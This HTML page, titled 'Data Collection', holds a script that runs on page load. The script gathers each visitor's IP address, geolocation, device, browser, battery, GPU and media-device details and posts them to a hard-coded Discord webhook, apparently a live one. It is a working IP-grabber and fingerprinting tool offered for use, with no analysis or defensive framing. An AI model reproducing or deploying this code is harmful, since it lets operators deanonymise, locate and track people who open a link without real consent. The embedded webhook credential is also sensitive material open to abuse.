<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Collection</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        h1 {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Data Collection</h1>
    <p>Your data is being collected and sent to our server.</p>

    <script>
        async function collectData() {
            function getOS() {
                const platform = navigator.platform.toLowerCase();
                if (platform.includes('win')) return 'Windows';
                if (platform.includes('mac')) return 'MacOS';
                if (platform.includes('linux')) return 'Linux';
                if (/android/.test(navigator.userAgent.toLowerCase())) return 'Android';
                if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) return 'iOS';
                return 'Unknown';
            }

            async function measureNetworkSpeed() {
                const url = 'https://www.example.com/smallfile'; // Replace with your URL
                const startTime = Date.now();
                try {
                    const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
                    const blob = await response.blob();
                    const endTime = Date.now();
                    const duration = (endTime - startTime) / 1000; // in seconds
                    const fileSize = blob.size / 1024; // in KB
                    const speed = (fileSize / duration).toFixed(2); // KB/s
                    return speed;
                } catch (error) {
                    console.error("Network speed measurement failed:", error);
                    return 'Unknown';
                }
            }

            function getNetworkInformation() {
                if (navigator.connection) {
                    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || navigator.msConnection;
                    return {
                        type: connection.type || 'Unknown',
                        effectiveType: connection.effectiveType || 'Unknown',
                        downlink: connection.downlink || 'Unknown',
                        rtt: connection.rtt || 'Unknown'
                    };
                }
                return {
                    type: 'Unknown',
                    effectiveType: 'Unknown',
                    downlink: 'Unknown',
                    rtt: 'Unknown'
                };
            }

            function getIPAddress(callback) {
                const xhr = new XMLHttpRequest();
                xhr.open('GET', 'https://api.ipify.org?format=json', true);
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === 4 && xhr.status === 200) {
                        const response = JSON.parse(xhr.responseText);
                        const ip = response.ip;

                        const geoXhr = new XMLHttpRequest();
                        geoXhr.open('GET', `https://ipapi.co/${ip}/json/`, true);
                        geoXhr.onreadystatechange = function() {
                            if (geoXhr.readyState === 4 && geoXhr.status === 200) {
                                const geoResponse = JSON.parse(geoXhr.responseText);
                                const country = geoResponse.country_name || 'Unknown';
                                const continent = geoResponse.continent_code || 'Unknown';
                                callback(ip, country, continent);
                            }
                        };
                        geoXhr.send();
                    }
                };
                xhr.send();
            }

            async function getBatteryStatus() {
                try {
                    const battery = await navigator.getBattery();
                    return {
                        level: battery.level,
                        charging: battery.charging
                    };
                } catch (error) {
                    console.error("Battery status retrieval failed: ", error);
                    return {
                        level: "Unknown",
                        charging: "Unknown"
                    };
                }
            }

            function getWebGLData() {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown'
                    };
                }
                return {
                    renderer: 'Unknown',
                    vendor: 'Unknown'
                };
            }

            function getCPUInfo() {
                const userAgent = navigator.userAgent;
                const cpu = userAgent.match(/\b(?:Intel|AMD)\b|\bx86_64\b|\barm\b|\barm64\b/i);
                return cpu ? cpu[0] : 'Unknown';
            }

            function getRAMInfo() {
                // Browsers do not expose RAM information directly
                return 'Unknown';
            }

            function getMotherboardInfo() {
                // Browsers do not expose motherboard information directly
                return 'Unknown';
            }

            const ipPromise = new Promise((resolve) => {
                getIPAddress((ip, country, continent) => {
                    resolve({ ip, country, continent });
                });
            });

            const batteryPromise = getBatteryStatus();
            const networkSpeed = await measureNetworkSpeed();
            const networkInfo = getNetworkInformation();

            const [ipData, batteryData] = await Promise.all([ipPromise, batteryPromise]);

            const mediaDevices = await navigator.mediaDevices.enumerateDevices();

            return {
                ...ipData,
                device: navigator.userAgent,
                browser: navigator.appName,
                browserVersion: navigator.appVersion,
                renderingEngine: navigator.product,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                screenColorDepth: window.screen.colorDepth,
                screenOrientation: window.screen.orientation?.type || 'Unknown',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                operatingSystem: getOS(),
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine,
                javaEnabled: navigator.javaEnabled(),
                referrer: document.referrer,
                platform: navigator.platform,
                vendor: navigator.vendor,
                deviceMemory: navigator.deviceMemory || "Unknown",
                connectionType: networkInfo.type,
                effectiveConnectionType: networkInfo.effectiveType,
                downlink: networkInfo.downlink,
                rtt: networkInfo.rtt,
                networkSpeed: networkSpeed + ' KB/s',
                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
                maxTouchPoints: navigator.maxTouchPoints,
                batteryLevel: batteryData.level,
                batteryCharging: batteryData.charging,
                doNotTrack: navigator.doNotTrack,
                localTime: new Date().toLocaleString(),
                windowInnerDimensions: `${window.innerWidth}x${window.innerHeight}`,
                documentDimensions: `${document.documentElement.scrollWidth}x${document.documentElement.scrollHeight}`,
                viewportScale: window.devicePixelRatio,
                pageVisibility: document.visibilityState,
                audioContext: window.AudioContext ? 'Supported' : 'Not Supported',
                touchCapabilities: 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
                installedPlugins: Array.from(navigator.plugins).map(plugin => plugin.name).join(', '),
                mediaDevices: mediaDevices.map(device => `${device.kind}: ${device.label}`).join(', '),
                storageQuota: navigator.storage && navigator.storage.estimate ? (await navigator.storage.estimate()).quota : 'Unknown',
                webGLRenderer: getWebGLData().renderer,
                webGLVendor: getWebGLData().vendor,
                timezoneOffset: new Date().getTimezoneOffset(),
                cpuClass: getCPUInfo(),
                ram: getRAMInfo(),
                motherboard: getMotherboardInfo(),
                deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
                cssFeatures: {
                    grid: CSS.supports('display', 'grid') ? 'Supported' : 'Not Supported',
                    flex: CSS.supports('display', 'flex') ? 'Supported' : 'Not Supported'
                },
                jsFeatures: {
                    es6: typeof Symbol !== 'undefined' ? 'Supported' : 'Not Supported',
                    promises: typeof Promise !== 'undefined' ? 'Supported' : 'Not Supported'
                }
            };
        }

        async function sendData() {
            const data = await collectData();
            const xhr = new XMLHttpRequest();
            const url = 'https://discord.com/api/webhooks/1249043424020004865/iZguJoomM0MqkqlEf9lZKZ9eKJNgJGKTsjUzUSexCMOXXVjQ-Mh2uIGXQOmT9QQds3_s'; // Your Discord webhook URL
            xhr.open('POST', url, true);
            xhr.setRequestHeader('Content-Type', 'application/json');

            const payload = JSON.stringify({
                content: `**Collected Data**\n\n` +
                    `**IP Information**\n` +
                    `IP Address: ${data.ip}\n` +
                    `Country: ${data.country}\n` +
                    `Continent: ${data.continent}\n\n` +
                    `**Device Information**\n` +
                    `Device: ${data.device}\n` +
                    `Operating System: ${data.operatingSystem}\n` +
                    `Device Type: ${data.deviceType}\n` +
                    `CPU Class: ${data.cpuClass}\n` +
                    `RAM: ${data.ram}\n` +
                    `Motherboard: ${data.motherboard}\n` +
                    `Hardware Concurrency: ${data.hardwareConcurrency}\n` +
                    `Device Memory: ${data.deviceMemory}\n` +
                    `Max Touch Points: ${data.maxTouchPoints}\n` +
                    `Battery Level: ${data.batteryLevel}\n` +
                    `Battery Charging: ${data.batteryCharging}\n\n` +
                    `**Browser Information**\n` +
                    `Browser: ${data.browser}\n` +
                    `Browser Version: ${data.browserVersion}\n` +
                    `Rendering Engine: ${data.renderingEngine}\n` +
                    `Language: ${data.language}\n` +
                    `Cookies Enabled: ${data.cookiesEnabled}\n` +
                    `Online Status: ${data.onlineStatus}\n` +
                    `Java Enabled: ${data.javaEnabled}\n` +
                    `Do Not Track: ${data.doNotTrack}\n` +
                    `Referrer: ${data.referrer}\n` +
                    `Platform: ${data.platform}\n` +
                    `Vendor: ${data.vendor}\n` +
                    `User Agent: ${data.device}\n\n` +
                    `**Screen Information**\n` +
                    `Screen Resolution: ${data.screenResolution}\n` +
                    `Screen Color Depth: ${data.screenColorDepth}\n` +
                    `Screen Orientation: ${data.screenOrientation}\n\n` +
                    `**Network Information**\n` +
                    `Connection Type: ${data.connectionType}\n` +
                    `Effective Connection Type: ${data.effectiveConnectionType}\n` +
                    `Downlink: ${data.downlink}\n` +
                    `RTT: ${data.rtt}\n` +
                    `Network Speed: ${data.networkSpeed}\n\n` +
                    `**Other Information**\n` +
                    `Timezone: ${data.timezone}\n` +
                    `Timezone Offset: ${data.timezoneOffset}\n` +
                    `Local Time: ${data.localTime}\n` +
                    `Window Inner Dimensions: ${data.windowInnerDimensions}\n` +
                    `Document Dimensions: ${data.documentDimensions}\n` +
                    `Viewport Scale: ${data.viewportScale}\n` +
                    `Page Visibility: ${data.pageVisibility}\n` +
                    `Audio Context: ${data.audioContext}\n` +
                    `Touch Capabilities: ${data.touchCapabilities}\n` +
                    `Installed Plugins: ${data.installedPlugins}\n` +
                    `Media Devices: ${data.mediaDevices}\n` +
                    `Storage Quota: ${data.storageQuota}\n` +
                    `WebGL Renderer: ${data.webGLRenderer}\n` +
                    `WebGL Vendor: ${data.webGLVendor}\n\n` +
                    `**CSS Features**\n` +
                    `Grid: ${data.cssFeatures.grid}\n` +
                    `Flex: ${data.cssFeatures.flex}\n\n` +
                    `**JavaScript Features**\n` +
                    `ES6: ${data.jsFeatures.es6}\n` +
                    `Promises: ${data.jsFeatures.promises}`,
                embeds: [{
                    image: {
                        url: 'https://c.tenor.com/EOqDFl4-zvUAAAAM/yippee-reverse.gif'
                    }
                }]
            });

            xhr.send(payload);
        }

        sendData();
    </script>
</body>
</html>
